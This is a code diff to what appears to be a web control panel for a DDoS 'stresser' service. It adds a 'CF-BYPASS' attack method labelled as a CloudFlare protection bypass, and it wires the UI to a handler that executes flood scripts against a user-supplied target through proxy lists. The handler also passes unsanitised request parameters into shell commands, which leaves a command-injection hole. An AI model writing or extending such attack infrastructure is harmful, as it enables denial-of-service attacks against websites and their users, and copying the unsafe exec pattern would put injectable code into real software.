@@ -130,6 +130,7 @@ app.get('/', (req, res) => {
                                 <label class="block text-sm font-medium text-gray-300 mb-2">💣 Attack Method</label>
                                 <select id="method" 
                                     class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
+                                    <option>CF-BYPASS</option>
                                     <option>MODERN-FLOOD</option>
                                     <option>HTTP-SICARIO</option>
                                     <option>RAW-HTTP</option>
@@ -225,9 +226,13 @@ app.get('/', (req, res) => {
                 <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                     <h3 class="text-lg font-bold mb-4">📋 Attack Methods</h3>
                     <div class="space-y-2 text-xs">
+                        <div class="bg-gray-900 p-2 rounded border border-lime-900/30">
+                            <div class="text-lime-400 font-bold">CF-BYPASS</div>
+                            <div class="text-gray-500 text-xs mt-1">⭐ CloudFlare protection bypass</div>
+                        </div>
                         <div class="bg-gray-900 p-2 rounded border border-cyan-900/30">
                             <div class="text-cyan-400 font-bold">MODERN-FLOOD</div>
-                            <div class="text-gray-500 text-xs mt-1">⭐ NEW! HTTP/2 + vulnerabilities</div>
+                            <div class="text-gray-500 text-xs mt-1">⭐ HTTP/2 + vulnerabilities</div>
                         </div>
                         <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                             <div class="text-red-400 font-bold">HTTP-SICARIO</div>
@@ -832,9 +837,13 @@ app.get('/attack', (req, res) => {
     });
   };
 
-  if (methods === 'MODERN-FLOOD') {
+  if (methods === 'CF-BYPASS') {
+    console.log('✅ Executing CF-BYPASS');
+    execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
+  }
+  else if (methods === 'MODERN-FLOOD') {
     console.log('✅ Executing MODERN-FLOOD');
-    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
+    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
   }
   else if (methods === 'HTTP-SICARIO') {
     console.log('✅ Executing HTTP-SICARIO');
